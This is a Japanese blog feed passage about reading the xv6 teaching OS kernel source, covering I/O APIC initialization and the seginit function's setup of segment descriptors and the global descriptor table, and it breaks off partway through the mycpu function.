            srcset=&quot;/static/fd74530a7bc6d1dd7ea4a28d709cede8/8ff5a/image-9.png 240w,
/static/fd74530a7bc6d1dd7ea4a28d709cede8/e85cb/image-9.png 480w,
/static/fd74530a7bc6d1dd7ea4a28d709cede8/0b533/image-9.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/fd74530a7bc6d1dd7ea4a28d709cede8/0b533/image-9.png&quot;
            alt=&quot;2022/02/image-9.png&quot;
            title=&quot;2022/02/image-9.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/9-series-chipset-pch-datasheet.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 9 Series Chipset Platform Controller Hub Datasheet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このbitはMaskフラグになっており、セットされた場合割込みが送信されなくなります。&lt;/p&gt;
&lt;p&gt;下位8bitに設定している値は割込みベクタです。&lt;/p&gt;
&lt;p&gt;なんで初期化時に無効化してるんでしょうか。。&lt;/p&gt;
&lt;p&gt;たぶん以降のコードを読めばわかると思うので引き続き進めていこうと思います。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;picinit&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;ioapicinit&lt;/code&gt;まで読み進めました。&lt;/p&gt;
&lt;p&gt;まだ読んでいない&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行している関数も残り10個になり、折り返しに差し掛かってきました。&lt;/p&gt;
&lt;p&gt;次回は&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数を読んでいきます。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -セグメントディスクリプタ初期化 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-008-kernel-main-05</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-008-kernel-main-05</guid><pubDate>Thu, 03 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-007-kernel-main-04&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行される&lt;code class=&quot;language-text&quot;&gt;lapicinit&lt;/code&gt;関数によるローカルAPICの設定を確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;seginit&lt;/code&gt;関数の挙動を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#seginit%E9%96%A2%E6%95%B0&quot;&gt;seginit関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#cpus%E9%96%A2%E6%95%B0&quot;&gt;cpus関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#gdt%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88&quot;&gt;GDTのセット&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;seginit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#seginit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;seginit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;seginit関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;seginit&lt;/code&gt;関数はCPUにカーネルセグメントディスクリプタを設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;seginit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// segment descriptors&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;seginit&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Set up CPU&apos;s kernel segment descriptors.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Run once on entry on each CPU.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;seginit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Map &quot;logical&quot; addresses to virtual addresses using identity map.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Cannot share a CODE descriptor for both kernel and user&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// because it would have to have DPL_USR, but the CPU forbids&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// an interrupt from CPL=0 to DPL=3.&lt;/span&gt;
  c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;cpuid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_KCODE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_X&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;STA_R&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_KDATA&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_W&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_UCODE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_X&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;STA_R&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DPL_USER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_UDATA&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_W&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DPL_USER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lgdt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ソースコードを読んでいきます。&lt;/p&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;proc.h&lt;/code&gt;で次のように定義されていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Per-CPU state&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar apicid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// Local APIC ID&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;scheduler&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// swtch() here to enter scheduler&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;taskstate&lt;/span&gt; ts&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// Used by x86 to find stack for interrupt&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;segdesc&lt;/span&gt; gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;NSEGS&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// x86 global descriptor table&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; uint started&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// Has the CPU started?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; ncli&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;token comment&quot;&gt;// Depth of pushcli nesting.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; intena&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// Were interrupts enabled before pushcli?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;proc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// The process running on this cpu or null&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体は、配列&lt;code class=&quot;language-text&quot;&gt;cpus&lt;/code&gt;に格納されています。&lt;/p&gt;
&lt;p&gt;これは、&lt;a href=&quot;/unix-xv6-006-kernel-main-03&quot;&gt;マルチプロセッサ 編&lt;/a&gt;で見た通り&lt;code class=&quot;language-text&quot;&gt;param.h&lt;/code&gt;で定義された&lt;code class=&quot;language-text&quot;&gt;NCPU&lt;/code&gt;に設定されている通り、最大8つのCPUをサポートする配列です。&lt;/p&gt;
&lt;h3 id=&quot;cpus関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cpus%E9%96%A2%E6%95%B0&quot; aria-label=&quot;cpus関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;cpus関数&lt;/h3&gt;
&lt;p&gt;配列&lt;code class=&quot;language-text&quot;&gt;cpus&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体を取得する箇所を見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;cpuid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cpuid&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;proc.c&lt;/code&gt;で以下のように定義された関数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mycpu&lt;/code&gt;関数の戻り値から&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;を引いた値を返します(何やってるんだろう…)。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Must be called with interrupts disabled&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;cpuid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Must be called with interrupts disabled to avoid the caller being&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// rescheduled between reading lapicid and running through the loop.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; apicid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;readeflags&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;FL_IF&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;mycpu called with interrupts enabled\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  apicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// APIC IDs are not guaranteed to be contiguous. Maybe we should have&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// a reverse map, or reserve a register to store &amp;amp;cpus[i].&lt;/span&gt;
